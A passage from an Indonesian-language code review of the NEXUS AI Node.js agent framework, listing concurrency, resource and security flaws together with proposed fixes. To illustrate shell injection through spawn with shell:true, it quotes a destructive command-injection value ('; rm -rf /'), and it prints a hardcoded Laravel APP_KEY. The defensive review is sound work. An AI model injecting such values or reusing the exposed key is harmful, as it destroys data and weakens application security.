    // ... gunakan namespacedKey
}
```

---

### 🔴 06 — `Logger._writeQueue` Dideklarasikan Tapi Tidak Digunakan → Race Condition

**File:** `agent/core/Logger.js`

**Masalah:**
```js
constructor(rootPath) {
    // ...
    this._writeQueue = Promise.resolve(); // ← dideklarasikan
}

async log(...) {
    // ...
    await fs.appendFile(logFile, JSON.stringify(logEntry) + '\n'); // ← tidak melalui _writeQueue
}
```

`this._writeQueue` ada tapi tidak pernah digunakan. Dengan 6 specialist agent berjalan paralel, semuanya bisa `appendFile` ke file `.ndjson` yang sama secara bersamaan. Di Node.js, concurrent `appendFile` ke file yang sama **tidak atomic** — baris JSON bisa terinterleave menghasilkan log yang corrupt.

**Dampak:** Log file corrupt, audit trail tidak dapat diandalkan.

**Solusi:**
```js
async log(...args) {
    this._writeQueue = this._writeQueue.then(() => this._doLog(...args));
    return this._writeQueue;
}

async _doLog(category, level, agent, task_id, event, message, ...) {
    // ... logika appendFile yang sudah ada
}
```

---

### 🟠 07 — `NexusEngine` adalah God Object: 20+ Dependency di Constructor

**File:** `agent/core/NexusEngine.js`

**Masalah:**
Constructor langsung menginstansiasi: `Modifier`, `MemoryPipeline`, `TDDGuard`, `TDDScaffolder`, `AssetEngine`, `Validator`, `BugHunter`, `Designer`, `AccessibilityScanner`, `SchemaGuard`, `QueryOptimizer`, `WorktreeManager`, `RootCauseAnalyzer`, `Machinist`, `Distiller`, `EvolutionPiper`, `DecisionEngine`, `ParallelRunner`, `NativeBridge`, `Orchestrator`, `ResourceMonitor`. Semua diinstansiasi tanpa kondisi, bahkan yang jarang dipakai.

**Dampak:** Memory overhead tinggi sejak startup; unit testing hampir mustahil tanpa mocking seluruh tree.

**Solusi:** Lazy initialization untuk komponen jarang dipakai:
```js
// Ganti: this.designer = new Designer();
get designer() {
    if (!this._designer) this._designer = new Designer();
    return this._designer;
}

// Komponen yang perlu lazy: NativeBridge, Designer, AccessibilityScanner,
// QueryOptimizer, WorktreeManager, EvolutionPiper
```

---

### 🟠 08 — `LocalIntelligence` Singleton dengan `isAvailable` Mutable → Race Condition

**File:** `agent/core/LocalIntelligence.js`

**Masalah:**
```js
module.exports = new LocalIntelligence(); // ← singleton
// this.isAvailable = false (mutable state)
```

Dengan `ParallelRunner` limit=3, tiga concurrent task bisa memanggil `generate()` bersamaan. Semua berbagi `this.isAvailable` yang sama — satu goroutine bisa mengubahnya di tengah pengecekan goroutine lain.

**Dampak:** Task bisa melewati pengecekan availability lalu fail di tengah jalan.

**Solusi:** Caching TTL untuk availability check:
```js
this._availabilityCache = { value: false, expiresAt: 0 };

async checkAvailability() {
    if (Date.now() < this._availabilityCache.expiresAt) {
        return this._availabilityCache.value;
    }
    try {
        // ... actual check
        this._availabilityCache = { value: true, expiresAt: Date.now() + 60000 };
        return true;
    } catch {
        this._availabilityCache = { value: false, expiresAt: Date.now() + 10000 };
        return false;
    }
}
```

---

### 🟠 09 — Ollama Tanpa Circuit Breaker → Death Spiral saat Overload

**File:** `agent/core/LocalIntelligence.js`

**Masalah:**
Tidak ada circuit breaker. Jika Ollama overload atau crash, tiap `generate()` menunggu hingga timeout, kemudian retry. Dengan 3 concurrent workers × 3 retry = 9 request menumpuk. CPU + RAM meledak.

**Dampak:** Cascade failure seluruh engine saat model overload.

**Solusi — State machine sederhana:**
```js
this.cb = { state: 'CLOSED', failures: 0, openedAt: null };

async generate(prompt, taskType) {
    if (this.cb.state === 'OPEN') {
        if (Date.now() - this.cb.openedAt < 30000) return null; // fail fast
        this.cb.state = 'HALF-OPEN';
    }
    try {
        const result = await this._doGenerate(prompt, taskType);
        this.cb = { state: 'CLOSED', failures: 0, openedAt: null };
        return result;
    } catch (e) {
        this.cb.failures++;
        this.cb.openedAt = Date.now();
        if (this.cb.failures >= 3) this.cb.state = 'OPEN';
        return null;
    }
}
```

---

### 🟠 10 — `EventBus`: Subscription Listener Tidak Pernah Dibersihkan → Memory Leak

**File:** `agent/core/EventBus.js`, `agent/core/Orchestrator.js`

**Masalah:**
`setupEventHandlers()` di Orchestrator mendaftarkan listener permanent untuk `SCANNER_TRIGGERED`, `TASK_FAILED`, dan `CYCLE_FINISHED`. Listener ini tidak pernah dihapus. Di lingkungan long-running (100 project cycle), listener menumpuk di EventEmitter.

`setMaxListeners(50)` hanya menekan warning, bukan solusi kebocoran.

**Dampak:** Memory leak progresif; performa menurun setelah banyak cycle.

**Solusi:** Tracking listener dan cleanup method:
```js
this._handlers = [];

_subscribe(event, fn) {
    EventBus.subscribe(event, fn);
    this._handlers.push({ event, fn });
}

destroy() {
    this._handlers.forEach(({ event, fn }) => EventBus.unsubscribe(event, fn));
    this._handlers = [];
}
```

---

### 🟠 11 — `AgentRegistry` Tidak Terhubung ke `Orchestrator` → Selalu Kosong

**File:** `agent/core/AgentRegistry.js`, `agent/core/Orchestrator.js`

**Masalah:**
`AgentRegistry` menyediakan `markBusy()`, `markIdle()`, `markFailed()`, dan `getStuckAgents()`. Tapi di `Orchestrator.setupEventHandlers()`, tidak ada satu pun panggilan ke registry:
```js
// Orchestrator.js — TIDAK ada:
// agentRegistry.markBusy(agentId, taskId);
// agentRegistry.markIdle(agentId);
```

`NexusEngine.getSystemStatus()` memanggil `agentRegistry.getHealthReport()` tapi selalu menghasilkan `{ total: 0, idle: 0, busy: 0 }` karena tidak ada yang pernah mendaftar.

**Dampak:** Stuck agent detection tidak berfungsi. Monitoring buta.

**Solusi:** Tambahkan di dalam `SCANNER_TRIGGERED` handler:
```js
EventBus.subscribe('SCANNER_TRIGGERED', async (payload) => {
    agentRegistry.markBusy(payload.agent, taskId);
    // ... existing logic
});

// Setelah task selesai:
agentRegistry.markIdle(payload.agent);
// Jika fail:
agentRegistry.markFailed(payload.agent, err.message);
```

---

### 🟠 12 — `EvolutionPiper.currentCycle` In-Memory → Reset saat Crash

**File:** `agent/core/EvolutionPiper.js`

**Masalah:**
```js
this.currentCycle = 0; // hanya ada di memory
```

Jika engine crash di cycle ke-23, saat restart `currentCycle` kembali ke 0. Guardrail `MAX_EVOLUTION_CYCLES = 25` menjadi tidak efektif — sistem bisa menjalankan jauh lebih dari 25 cycle sebenarnya.

**Dampak:** Guardrail bypass; resource exhaustion tanpa batas.

**Solusi:** Persist counter ke disk:
```js
async loadCycleState() {
    const statePath = path.join(this.rootPath, 'nexus', '.evolution_state.json');
    if (await fs.pathExists(statePath)) {
        const state = await fs.readJson(statePath);
        this.currentCycle = state.currentCycle || 0;
        this.sessionStartTime = state.sessionStartTime || null;
    }
}

async persistCycleState() {
    const statePath = path.join(this.rootPath, 'nexus', '.evolution_state.json');
    await fs.writeJson(statePath, {
        currentCycle: this.currentCycle,
        sessionStartTime: this.sessionStartTime
    });
}
```

---

### 🟠 13 — `WorktreeManager.finalize()` Menggunakan `execSync` → Memblok Event Loop

**File:** `agent/core/WorktreeManager.js`

**Masalah:**
```js
execSync(`git checkout main && git merge feature/${featureName}`, { cwd: this.rootPath });
```

`execSync` memblok seluruh Node.js event loop. Jika git mengalami merge conflict, network issue, atau repository besar, seluruh engine freeze selama operasi berlangsung — tidak ada timeout, tidak ada escape.

**Dampak:** Engine freeze total selama git operations.

**Solusi:** Gunakan `spawn` dengan Promise wrapper (sudah ada pola ini di `NativeBridge`):
```js
const { spawn } = require('child_process');

async _execGit(args, cwd, timeoutMs = 30000) {
    return new Promise((resolve, reject) => {
        const proc = spawn('git', args, { cwd, shell: false });
        let out = '', err = '';
        const timer = setTimeout(() => { proc.kill(); reject(new Error('Git timeout')); }, timeoutMs);
        proc.stdout.on('data', d => out += d);
        proc.stderr.on('data', d => err += d);
        proc.on('close', code => {
            clearTimeout(timer);
            code === 0 ? resolve(out.trim()) : reject(new Error(err));
        });
    });
}
```

---

### 🟠 14 — `AuditPhase`: 6 Scanner Berjalan Bersamaan Tanpa Concurrency Limit

**File:** `agent/core/phases/AuditPhase.js`

**Masalah:**
```js
const auditPromises = specialists.map(async (spec) => {
    // Spawn Worker + Ollama call per specialist
});
await Promise.all(auditPromises); // 6 concurrent Workers + Ollama
```

Enam Workers berjalan sekaligus, masing-masing berpotensi memanggil Ollama. Pada 8GB RAM dengan Vega 8 shared, ini cukup untuk menyebabkan OOM killer melakukan terminasi proses.

**Dampak:** OOM kill di mesin dengan RAM terbatas.

**Solusi:** Gunakan `ParallelRunner` yang sudah ada:
```js
const results = await ParallelRunner.run(
    specialists,
    async (spec) => { /* ... logika audit */ },
    2  // max 2 concurrent scanner untuk 8GB RAM
);
```

---

### 🟠 15 — `SemanticEngine.cosineSimilarity`: Tidak Ada Zero-Norm Guard → NaN Corruption

**File:** `agent/core/SemanticEngine.js`

**Masalah:**
```js
cosineSimilarity(vecA, vecB) {
    // ...
    return dotProduct / (Math.sqrt(normA) * Math.sqrt(normB));
    // ⚠️ Jika normA atau normB = 0 → NaN
}
```

Jika embedding menghasilkan zero vector (model gagal, dokumen kosong), pembagian dengan 0 menghasilkan `NaN`. `NaN` kemudian menginfeksi seluruh hasil sort dan ranking.

**Dampak:** Semantic search mengembalikan urutan acak / undefined behavior.

**Solusi:**
```js
cosineSimilarity(vecA, vecB) {
    let dotProduct = 0, normA = 0, normB = 0;
    for (let i = 0; i < vecA.length; i++) {
        dotProduct += vecA[i] * vecB[i];
        normA += vecA[i] * vecA[i];
        normB += vecB[i] * vecB[i];
    }
    const denom = Math.sqrt(normA) * Math.sqrt(normB);
    if (denom === 0) return 0; // Zero vector = no similarity
    return dotProduct / denom;
}
```

---

### 🟠 16 — `RedisMemory`: `connect()` Tidak Dipanggil Sebelum `get()`/`set()`

**File:** `agent/core/RedisMemory.js`, `agent/core/SemanticEngine.js`

**Masalah:**
```js
// SemanticEngine.js
const cachedResults = await redis.get(cacheKey); // redis.isConnected = false
// → returns null, cache tidak pernah bekerja
```

`RedisMemory` hanya connect jika `connect()` dipanggil secara eksplisit. Tapi `SemanticEngine` dan komponen lain langsung memanggil `redis.get()` / `redis.set()` tanpa `await redis.connect()` terlebih dahulu. Hasilnya: Redis cache **tidak pernah berfungsi** meskipun kode seolah menggunakannya.

**Dampak:** Cache miss 100% → setiap search rebuild TF-IDF dari scratch.

**Solusi:** Auto-connect dengan lazy pattern:
```js
async _ensureConnected() {
    if (!this.isConnected) await this.connect();
}

async get(key) {
    await this._ensureConnected();
    if (!this.isConnected) return null;
    // ...
}
```

---

### 🟡 17 — `NexusEngine.runCycle()`: Tidak Ada Global Timeout

**File:** `agent/core/NexusEngine.js`

**Masalah:**
`runCycle()` tidak memiliki batas waktu global. Jika fase audit, planning, atau execution hang (misalnya karena Ollama lambat), seluruh cycle berjalan tanpa henti.

**Solusi:**
```js
async runCycle(options = {}) {
    const CYCLE_TIMEOUT_MS = 10 * 60 * 1000; // 10 menit
    const cyclePromise = this._doRunCycle(options);
    const timeoutPromise = new Promise((_, reject) =>
        setTimeout(() => reject(new NexusError('TIMEOUT', 'Cycle exceeded 10 minutes')), CYCLE_TIMEOUT_MS)
    );
    return Promise.race([cyclePromise, timeoutPromise]);
}
```

---

### 🟡 18 — `EventBus`: Deduplication 1 Detik Terlalu Agresif

**File:** `agent/core/EventBus.js`

**Masalah:**
```js
const eventKey = `${event}-${JSON.stringify(payload)}`;
if (this._recentEvents.has(eventKey)) return; // Drop!
```

Dua task berbeda yang menghasilkan payload identik dalam 1 detik akan di-drop satu di antaranya secara diam-diam. Kasus nyata: dua scanner mengirim `SCANNER_TRIGGERED` untuk file yang sama dalam waktu berdekatan.

**Solusi:** Dedup berdasarkan `task_id`, bukan seluruh payload:
```js
const eventKey = `${event}-${payload?.task_id || JSON.stringify(payload)}`;
```

---

### 🟡 19 — `MemoryPipeline.writeSemanticIndex()` Duplikat dengan `SemanticEngine`

**File:** `agent/core/MemoryPipeline.js`, `agent/core/SemanticEngine.js`

**Masalah:**
Dua sistem index berjalan paralel dan tidak terhubung:
- `MemoryPipeline.writeSemanticIndex()` → regex tag extraction → `semantic_tag_index.json`
- `SemanticEngine.buildIndex()` → TF-IDF + Ollama embeddings → `vector_index.json`

Keduanya menulis ke direktori `semantic/` yang sama dengan format berbeda. SemanticEngine yang digunakan aktif untuk search, sementara MemoryPipeline menghasilkan file yang tidak pernah dibaca.

**Solusi:** Hapus `writeSemanticIndex()` dari `MemoryPipeline`. Delegasikan sepenuhnya ke `SemanticEngine.buildIndex()`. Panggil dari `KnowledgePhase` setelah `memoryPipeline.optimize()` selesai.

---

### 🟡 20 — `MemoryGovernor` vs `MemoryPipeline`: Ownership Tumpang Tindih

**File:** `agent/core/MemoryGovernor.js`, `agent/core/MemoryPipeline.js`

**Masalah:**
Keduanya mengelola direktori `memory/` yang sama:
- `MemoryGovernor`: tulis ke `memory/[category]/`, acquire file lock, versioning
- `MemoryPipeline`: tulis ke `memory/distilled/`, `memory/archived/`, versioned write sendiri

Tidak ada batas kepemilikan yang jelas. `NexusEngine` menginstansiasi `MemoryPipeline` tapi `MemoryGovernor` diimport tapi tidak di-`new` secara eksplisit di constructor `NexusEngine` — kemungkinan besar unused instance.

**Solusi:** Tetapkan boundary yang jelas:
- `MemoryGovernor` → semua write ke `memory/` (owner tunggal, semua lewat sini)
- `MemoryPipeline` → orchestration logic (kapan archive, kapan distill), delegasikan write ke `MemoryGovernor`

---

### 🟡 21 — `Contract.js` Menggunakan `new Date()` Bukan `NexusClock`

**File:** `agent/core/Contract.js`

**Masalah:**
```js
class AuditReport {
    constructor(...) {
        this.timestamp = new Date().toISOString(); // ← UTC (Z suffix)
    }
}
```

`NexusClock` sudah dibuat untuk memastikan konsistensi timestamp UTC+8 di seluruh sistem, tapi `AuditReport` dan `ImplementationPlan` masih menggunakan `new Date().toISOString()` yang menghasilkan format `2026-05-16T07:00:00.000Z`. Hasilnya: timestamp di audit report bertentangan dengan timestamp di log file.

**Solusi:**
```js
const NexusClock = require('./NexusClock');

class AuditReport {
    constructor(...) {
        this.timestamp = NexusClock.getISOTimestamp();
    }
}
```

---

### 🟡 22 — `ExecutionPhase.cleanCodeAndVerify()`: Pola Legacy Hardcoded

**File:** `agent/core/phases/ExecutionPhase.js`

**Masalah:**
```js
const legacyPatterns = ['UrlShortener', 'UrlMapping', 'ShortenUrl', 'UrlController'];
```

Pola ini adalah sisa dari sandbox `url-shortener` yang dijadikan template. Ketika NEXUS dijalankan pada project lain (misal SaaS, e-commerce), fungsi ini akan:
1. Tidak menemukan apa-apa → silent no-op
2. Atau, jika project kebetulan punya class bernama serupa → menghapus file yang valid

**Solusi:** Bangun `legacyPatterns` secara dinamis dari `NEXUS_BLUEPRINT.json`:
```js
const blueprint = await fs.readJson(blueprintPath).catch(() => ({}));
const allowedComponents = (blueprint.livewire_components || []).map(c => this.toKebabCase(c));
const legacyPatterns = blueprint.legacy_patterns || [];
```

---

### 🟡 23 — `main.js` Membuat Dua Instance `Orchestrator` yang Berbeda

**File:** `agent/main.js`

**Masalah:**
```js
// main.js
const engine = new NexusEngine({ rootPath: ... });        // → this.orchestrator = new Orchestrator(...)
const orchestrator = new Orchestrator(path.resolve(...)); // ← Instance kedua, tidak pernah dipakai
```

`NexusEngine` sudah membuat instance `Orchestrator` internal. Instance kedua di `main.js` memiliki DLQ terpisah, EventBus listeners terpisah, dan tidak pernah digunakan. Ini membuang memori dan bisa menyebabkan dua listener `SCANNER_TRIGGERED` aktif sekaligus.

**Solusi:** Hapus baris `const orchestrator = new Orchestrator(...)` dari `main.js`. Gunakan `engine.orchestrator` jika perlu akses dari luar.

---

### 🟡 24 — `EvolutionPiper.spawnRealLaravel()`: Dead Code

**File:** `agent/core/EvolutionPiper.js`

**Masalah:**
```js
async spawnRealLaravel(name) {
    await this.checkEvolutionBoundary();
    const targetPath = path.join(this.sandboxPath, name);
    await fs.ensureDir(targetPath);
    console.log(`🚀 Installing real Laravel...`);
    
    // This will be executed via run_command in the main flow
    return targetPath; // ← Tidak ada Composer, tidak ada installasi
}
```

Fungsi ini hanya membuat direktori kosong. Tidak ada `composer create-project` atau instalasi apapun. Komentar "will be executed via run_command" menunjukkan ini belum diimplementasikan.

**Dampak:** Siapapun yang memanggil `spawnRealLaravel()` mendapat direktori kosong tanpa Laravel.

**Solusi:** Implementasikan atau tandai sebagai `@throws`:
```js
async spawnRealLaravel(name) {
    throw new Error('spawnRealLaravel: Not yet implemented. Use spawnSandbox() with scenario "crud" instead.');
}
```

---

### 🟡 25 — `Distiller` Menginstansiasi `NativeBridge` yang Tidak Pernah Dipakai

**File:** `agent/core/Distiller.js`

**Masalah:**
```js
class Distiller {
    constructor(knowledgePath) {
        this.semanticEngine = new SemanticEngine(knowledgePath);
        this.native = new NativeBridge(path.join(knowledgePath, '..', '..')); // ← tidak pernah dipanggil
    }
}
```

`this.native` dideklarasikan tapi tidak ada satu pun method `Distiller` yang memanggilnya. Ini membuang memori dan membingungkan — apakah ada rencana integrasi C++ di Distiller yang belum diimplementasikan?

**Solusi:** Hapus baris `this.native = new NativeBridge(...)` sampai ada kebutuhan konkret, atau dokumentasikan tujuannya.

---

### 🟡 26 — `ExecutionPhase.getAvailablePort()`: Rekursi Tanpa Batas Atas

**File:** `agent/core/phases/ExecutionPhase.js`

**Masalah:**
```js
async getAvailablePort(start = 8001) {
    const net = require('net');
    return new Promise((resolve) => {
        const server = net.createServer();
        server.listen(start, () => {
            server.close(() => resolve(start));
        });
        server.on('error', () => {
            resolve(this.getAvailablePort(start + 1)); // ← rekursi tanpa batas
        });
    });
}
```

Jika semua port dari 8001 hingga 65535 terisi (sangat tidak mungkin tapi mungkin di lingkungan container yang terbatas), fungsi ini akan stack overflow. Juga tidak ada cara untuk menghentikan pencarian.

**Solusi:**
```js
async getAvailablePort(start = 8001, maxPort = 9000) {
    if (start > maxPort) throw new Error(`No available port found between 8001-${maxPort}`);
    // ... existing logic dengan maxPort check
}
```

---

### 🟡 27 — CI Tidak Test Redis/Ollama + `.env` dengan APP_KEY di Repo

**File:** `.github/workflows/ci.yml`, `agent/core/EvolutionPiper.js`, `.env`

**Masalah A — CI:**
```yaml
# ci.yml — tidak ada:
# services: redis: ...
# Ollama mock/stub
```

`npm test` dijalankan tanpa Redis atau Ollama. Karena `RedisMemory` dan `LocalIntelligence` keduanya memiliki graceful fallback (`return null`, `return false`), CI selalu hijau meskipun integrasi tersebut broken.

**Masalah B — APP_KEY hardcoded:**
```js
// EvolutionPiper.spawnSandbox() — hardcoded di source code:
{ name: '.env', content: 'APP_KEY=base64:a7gkNyQZZ4HamHeiMoQ2gFJygojiFUCyzXDTKQ3YwG4=' }
```

Laravel APP_KEY hardcoded di source code. Meskipun ini untuk sandbox test, key ini bisa disalahgunakan jika seseorang reuse untuk production.

**Solusi A:**
```yaml
# Tambahkan di ci.yml
services:
  redis:
    image: redis:7-alpine
    ports: ['6379:6379']
# Untuk Ollama: gunakan mock/stub di test environment
```

**Solusi B:**
```js
// Generate key dinamis:
const { execSync } = require('child_process');
const appKey = `base64:${require('crypto').randomBytes(32).toString('base64')}`;
{ name: '.env', content: `APP_KEY=${appKey}` }
```

---

## Rekap & Roadmap Perbaikan

### Phase 1 — Immediate (sebelum cycle berikutnya)
| No | Isu | Effort |
|----|-----|--------|
| 01 | Pecah prompt monolitik 2MB | 2-3 jam |
| 02 | Tambah timeout di `executeTask` | 30 menit |
| 03 | Fix `.exe` hardcode di `NativeBridge` | 15 menit |
| 04 | Fix path traversal di `SandboxExecutor` | 1 jam |
| 05 | Ganti `flushAll()` dengan namespace delete | 30 menit |
| 06 | Implementasi `_writeQueue` di `Logger` | 1 jam |

### Phase 2 — Sprint Berikutnya
| No | Isu | Effort |
|----|-----|--------|
| 07 | Lazy init `NexusEngine` | 3-4 jam |
| 08 | Fix `LocalIntelligence` singleton race | 1 jam |
| 09 | Circuit breaker Ollama | 2 jam |
| 10 | EventBus listener cleanup | 1 jam |
| 11 | Wire `AgentRegistry` ke Orchestrator | 2 jam |
| 12 | Persist `EvolutionPiper` cycle state | 1 jam |
| 13 | Async `WorktreeManager` | 1 jam |
| 14 | Tambah `pLimit` di `AuditPhase` | 30 menit |
| 15 | Zero-norm guard `cosineSimilarity` | 15 menit |
| 16 | Auto-connect `RedisMemory` | 30 menit |

### Phase 3 — Technical Debt
| No | Isu | Effort |
|----|-----|--------|
| 17 | Global timeout `runCycle` | 30 menit |
| 18 | Fix EventBus dedup key | 15 menit |
| 19 | Hapus duplicate semantic index | 1 jam |
| 20 | Tetapkan boundary MemoryGovernor/Pipeline | 2-3 jam |
| 21 | Konsistensi timestamp Contract.js | 15 menit |
| 22 | Dynamic legacy patterns | 1 jam |
| 23 | Hapus duplicate Orchestrator di main.js | 15 menit |
| 24 | Stub atau implementasikan spawnRealLaravel | 2-4 jam |
| 25 | Hapus unused NativeBridge di Distiller | 5 menit |
| 26 | Bounded recursion getAvailablePort | 15 menit |
| 27 | Fix CI + rotate hardcoded APP_KEY | 1 jam |

---

## Hal yang Sudah Baik ✅

Dokumentasi ini bukan sekadar daftar masalah. NEXUS AI memiliki beberapa keputusan arsitektur yang patut dipertahankan:

- **EventBus dengan schema validation** — event schema registry mencegah typo event name
- **Dead Letter Queue di Orchestrator** — task gagal tidak hilang begitu saja
- **Guardrail whitelist di LocalIntelligence** — task whitelist + output length cap
- **Versioned write di MemoryPipeline** — tidak ada data yang overwritten tanpa backup
- **Stale lock detection di MemoryGovernor** — lock file dengan TTL + PID tracking
- **ResourceMonitor tiered recommendation** — PROCEED/THROTTLE/PAUSE berdasarkan CPU+RAM
- **DecisionEngine weight profiles** — context-aware decision making yang extensible
- **Machinist path whitelist** — generated scanner tidak bisa menyentuh core engine
- **TaskProtocol dengan trace_id** — setiap task bisa di-trace end-to-end

---

*Report ini dihasilkan dari analisis statis terhadap source code NEXUS AI v3.3.0.*  
*Total file dianalisis: 27 | Total isu ditemukan: 27 | Critical: 6 | High: 10 | Medium: 11*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, saas, api]

### 📘 KNOWLEDGE: NEXUS_AI_CODE_REVIEW.MD

# 🤖 NEXUS AI — Laporan Code Review Komprehensif
> **VERSION**: v1 | **Last Updated**: 26/05/2026


**Tanggal Review:** 15 Mei 2026  
**Reviewer:** AI Engineering Assistant Senior  
**Versi Project:** 3.3.0  
**Klasifikasi:** Internal Engineering Report

---

## 1. RINGKASAN PROJECT

**Human-AI Nexus** adalah sebuah framework CLI (Command Line Interface) berbasis **Node.js** yang bertindak sebagai "otak" agentic untuk mengaudit, merencanakan, dan mengeksekusi perbaikan pada project lain (khususnya stack TALL: Tailwind, Alpine.js, Livewire, Laravel).

| Aspek | Detail |
|---|---|
| **Nama** | `human-ai-nexus` |
| **Versi** | `3.3.0` |
| **Runtime** | Node.js ≥ 16, dijalankan di Node 22 (Docker) |
| **Bahasa** | JavaScript (CommonJS) |
| **Framework** | Custom multi-agent framework (tanpa Express/NestJS) |
| **Entry Point** | `cli.js` → `agent/main.js` → `agent/core/NexusEngine.js` |
| **Containerisasi** | Docker + Docker Compose |
| **CI/CD** | GitHub Actions (`npm-publish.yml`) |
| **Testing** | Custom TDD runner (`tests/TDD/runner.js`) |
| **Dependensi Utama** | `axios`, `chalk`, `fs-extra`, `glob`, `natural`, `redis` |
| **AI Backend** | Ollama (lokal) via `http://localhost:11434` |
| **Memory** | Redis + file-based JSON/Markdown |

### Arsitektur Folder
```
NEXUS AI/
├── agent/
│   ├── core/            # Engine utama (NexusEngine, Orchestrator, dll)
│   ├── tools/           # Scanner & tool plugins
│   ├── prompts/         # Prompt agent (internal & external)
│   ├── workflows/       # Definisi workflow per agent
│   └── main.js          # Entry point agent
├── cli.js               # CLI dispatcher
├── tests/TDD/           # Unit & sandbox tests
├── documentation/       # Audit logs & mermaid diagrams
├── config/              # .env.example
├── .github/workflows/   # CI/CD pipeline
├── Dockerfile
└── docker-compose.yml
```

**Kekuatan Arsitektur:** Pemisahan yang jelas antara `core/`, `tools/`, `prompts/`, dan `workflows/` menunjukkan pemikiran modular yang matang. Penggunaan `EventBus` sebagai pub/sub backbone dan `DeadLetterQueue` menunjukkan pemahaman sistem distributed yang baik.

---

## 2. TEMUAN UTAMA

### 🔴 KRITIS
1. **`.env` ter-commit ke Git** — file `.env` dengan path sensitif (`/home/faisal/projects/...`) ada di dalam ZIP, artinya pernah atau masih di-track oleh Git.
2. **`SandboxExecutor` bukan sandbox nyata** — meski bernama "sandbox", eksekusi plugin dilakukan via `require()` langsung di process utama, bukan `vm.runInNewContext` atau Worker Thread sesungguhnya.
3. **`shell: true` pada `spawn()`** — di `cli.js` dan `NexusEngine.js`, penggunaan `shell: true` membuka potensi shell injection jika input berasal dari user/external.

### 🟠 PENTING
4. **`initRedis()` tanpa error handling** — jika Redis tidak tersedia, proses utama bisa crash diam-diam.
5. **`package-lock.json` tidak ada** — CI/CD menggunakan `npm ci` yang membutuhkan `package-lock.json`, ini akan selalu gagal.
6. **`docker-compose.yml` tidak memiliki `env_file`** — environment secrets tidak dimasukkan dengan aman ke container.
7. **CI/CD pipeline hanya trigger saat `release`** — tidak ada pipeline untuk `push` atau `pull_request`, sehingga tidak ada otomasi testing pada development sehari-hari.

### 🟡 PERLU PERHATIAN
8. **Logger menulis ulang seluruh array JSON setiap log entry** — performa I/O buruk saat log volume tinggi.
9. **Koneksi Redis dibuat satu kali global (singleton)** tanpa reconnect logic.
10. **`SemanticEngine` menggunakan TF-IDF lokal** yang diload ke memori seluruhnya — potensi memory bloat untuk knowledge base besar.

---

## 3. REVIEW KODE

### 3.1 `cli.js` — Entry Point

**Masalah ditemukan:**

```javascript
// ❌ MASALAH: shell: true + template literal dari args user
const child = spawn('node', [`"${enginePath}"`, ...cleanArgs], {
    stdio: 'inherit',
    shell: true  // ← Bahaya! Shell injection possible
});
```

`cleanArgs` berasal langsung dari `process.argv` user. Jika user memasukkan `; rm -rf /`, `shell: true` akan mengeksekusinya. Seharusnya:

```javascript
// ✅ Perbaikan: Gunakan array args tanpa shell
const child = spawn('node', [enginePath, ...cleanArgs], {
    stdio: 'inherit',
    shell: false  // ← Aman, args tidak diproses shell
});
```

**Kekuatan:** Struktur command dispatch (router `engineCommands`) rapi dan mudah diperluas.

---

### 3.2 `agent/core/NexusEngine.js` — Core Engine (1317 baris)

File ini terlalu besar. Single file 1317 baris melanggar prinsip Single Responsibility. Berikut masalah spesifik:

**a) `initRedis()` tanpa error handling:**
```javascript
async initRedis() {
    await redis.connect();        // ← Jika Redis down, throw tanpa catch
    await localAI.checkAvailability();
}
```
Akibatnya, jika Redis tidak aktif, NexusEngine gagal inisialisasi secara diam-diam (error tidak ditangkap di constructor karena `initRedis()` dipanggil tanpa `await` di constructor).

**b) `spawn` dengan `shell: true` di `cleanCodeAndVerify()`:**
```javascript
const serveProc = spawn('php', ['artisan', 'serve', '--port=8001'], 
    { cwd: projectPath, shell: true });  // ← projectPath dari user input
```
`projectPath` bisa dimanipulasi.

**c) `require()` di dalam loop/fungsi:**
```javascript
async blueprintApp(options = {}) {
    const LocalIntelligence = require('./LocalIntelligence'); // ← Inside method
    // ...
    const { spawn } = require('child_process'); // ← Inside loop
}
```
`require()` seharusnya di top-level file untuk kejelasan dependency dan performa.

**Kekuatan:** Design pattern state machine (`STATES: INIT, PROCESSING, EXECUTING...`) dan custom `NexusError` class sangat baik untuk traceability.

---

### 3.3 `agent/core/SandboxExecutor.js` — "Sandbox" yang Bukan Sandbox

```javascript
// ❌ Ini bukan sandbox nyata!
const plugin = require(pluginPath);  // ← Berjalan di process yang sama
const action = plugin.scan ? plugin.scan : plugin.execute;
Promise.resolve(action(args)).then(...);
```

Nama `SandboxExecutor` menyesatkan. Plugin yang di-require bisa:
- Mengakses `process.env` (termasuk secrets)
- Menulis ke filesystem sembarangan
- Melakukan network request
- Memanggil `process.exit()`

Jika benar-benar ingin isolated sandbox, harus menggunakan:
```javascript
// ✅ Opsi 1: Worker Threads (sudah ada import tapi tidak dipakai)
const { Worker } = require('worker_threads'); // ← Sudah di-import tapi tidak digunakan!

// ✅ Opsi 2: vm2 / isolated-vm library
```

**Ironi:** `Worker` sudah di-import di baris pertama file tapi tidak pernah digunakan.

---

### 3.4 `agent/core/EventBus.js` — Solid

EventBus adalah salah satu implementasi paling bersih di project ini:
- Schema registry (`EVENT_SCHEMA`) mencegah typo event name
- Deduplication dengan TTL 1 detik mencegah event storm
- Audit log untuk traceability

**Satu catatan:** Deduplication menggunakan `JSON.stringify(payload)` yang bisa salah untuk payload besar (object dengan property sama tapi order berbeda tidak akan ter-deduplicate).

---

### 3.5 `agent/core/Logger.js` — Performa I/O Buruk

```javascript
// ❌ Setiap log entry: baca seluruh file → push → tulis ulang seluruh file
let logs = [];
if (await fs.pathExists(logFile)) {
    logs = await fs.readJson(logFile);  // Baca seluruh array
}
logs.push(logEntry);
await fs.writeJson(logFile, logs, { spaces: 2 }); // Tulis ulang seluruh file
```

Untuk sistem dengan aktivitas tinggi, pola ini adalah bottleneck besar. Dengan 1000 log entries, setiap operasi baca-tulis semakin lambat. Solusi:
```javascript
// ✅ Gunakan append mode (NDJSON/newline-delimited JSON)
await fs.appendFile(logFile, JSON.stringify(logEntry) + '\n');
```

---

### 3.6 `agent/core/AgentRegistry.js` — Bagus

Implementasi yang solid dengan API yang jelas (`register`, `markBusy`, `markIdle`, `markFailed`, `getStuckAgents`). Deteksi "stuck agent" dengan threshold time adalah fitur production-grade yang baik.

---

### 3.7 `agent/core/SemanticEngine.js` — Fungsional, Ada Risk

- TF-IDF via `natural` library bekerja untuk use case ini
- Integrasi Ollama untuk embedding adalah pilihan baik (local-first AI)
- Redis caching untuk search results (TTL 30 menit) efisien

**Risiko:** `buildIndex()` membaca semua file knowledge ke memori sekaligus. Untuk knowledge base besar (>500 files), ini bisa menyebabkan OOM.

---

